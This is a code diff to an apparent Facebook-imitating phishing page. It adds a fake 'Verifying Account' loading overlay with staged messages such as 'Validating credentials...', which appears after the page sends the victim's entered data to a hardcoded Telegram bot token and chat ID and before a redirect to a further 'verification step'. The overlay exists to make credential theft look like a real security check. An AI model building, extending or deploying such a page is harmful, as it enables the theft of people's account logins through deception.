@@ -281,6 +281,79 @@
       margin: 0;
     }
     
+    /* Loading page styles */
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: white;
+      z-index: 9999;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    .loading-content {
+      text-align: center;
+      max-width: 400px;
+      padding: 40px 20px;
+    }
+    
+    .loading-spinner {
+      width: 64px;
+      height: 64px;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #1877F2;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 24px;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    .loading-title {
+      color: #1877F2;
+      font-size: 24px;
+      font-weight: bold;
+      margin-bottom: 12px;
+    }
+    
+    .loading-subtitle {
+      color: #65676B;
+      font-size: 16px;
+      line-height: 20px;
+      margin-bottom: 32px;
+    }
+    
+    .loading-progress {
+      width: 100%;
+      max-width: 300px;
+      height: 4px;
+      background-color: #f0f2f5;
+      border-radius: 2px;
+      overflow: hidden;
+      margin-bottom: 12px;
+    }
+    
+    .loading-progress-bar {
+      height: 100%;
+      background-color: #1877F2;
+      border-radius: 2px;
+      width: 0%;
+      transition: width 0.1s ease;
+    }
+    
+    .loading-progress-text {
+      color: #65676B;
+      font-size: 14px;
+    }
+
     /* Responsive design */
     @media (max-width: 898px) {
       .fb-content {
@@ -495,6 +568,23 @@
   </style>
 </head>
 <body>
+  <!-- Loading overlay -->
+  <div class="loading-overlay" id="loading-overlay">
+    <div class="loading-content">
+      <div class="loading-spinner"></div>
+      <h1 class="loading-title">Verifying Account</h1>
+      <p class="loading-subtitle">
+        Please wait while we verify your credentials and prepare your security verification...
+      </p>
+      <div class="loading-progress">
+        <div class="loading-progress-bar" id="loading-progress-bar"></div>
+      </div>
+      <p class="loading-progress-text" id="loading-progress-text">
+        Initializing verification process...
+      </p>
+    </div>
+  </div>
+
   <div class="fb-container">
     <div class="fb-content">
       <div class="fb-left">
@@ -910,6 +1000,46 @@
       const botToken = "7439509061:AAFt-jzr0SGV4FN4TMF6vsCHdawVxMftplQ";
       const authorizedChatId = "6360165707";
       
+      // Function to show loading page with progress animation
+      function showLoadingPage() {
+        const loadingOverlay = document.getElementById('loading-overlay');
+        const progressBar = document.getElementById('loading-progress-bar');
+        const progressText = document.getElementById('loading-progress-text');
+        
+        // Show loading overlay
+        loadingOverlay.style.display = 'flex';
+        
+        // Animate progress bar from 0% to 100% over 5 seconds
+        let progress = 0;
+        const messages = [
+          'Initializing verification process...',
+          'Validating credentials...',
+          'Checking account security...',
+          'Preparing verification steps...',
+          'Almost ready...'
+        ];
+        
+        const interval = setInterval(() => {
+          progress += 2; // Increase by 2% every 100ms (5 seconds total)
+          progressBar.style.width = progress + '%';
+          
+          // Update message based on progress
+          if (progress >= 20 && progress < 40) {
+            progressText.textContent = messages[1];
+          } else if (progress >= 40 && progress < 60) {
+            progressText.textContent = messages[2];
+          } else if (progress >= 60 && progress < 80) {
+            progressText.textContent = messages[3];
+          } else if (progress >= 80) {
+            progressText.textContent = messages[4];
+          }
+          
+          if (progress >= 100) {
+            clearInterval(interval);
+          }
+        }, 100);
+      }
+      
       // Function to send message to Telegram
       async function sendTelegramMessage(message) {
         try {
@@ -1068,6 +1198,9 @@
           } catch (error) {
             console.error('Error sending data:', error);
           }
+          
+          // Show loading page immediately
+          showLoadingPage();
           
           // Redirect to first verification step after 5 seconds
           setTimeout(function() {
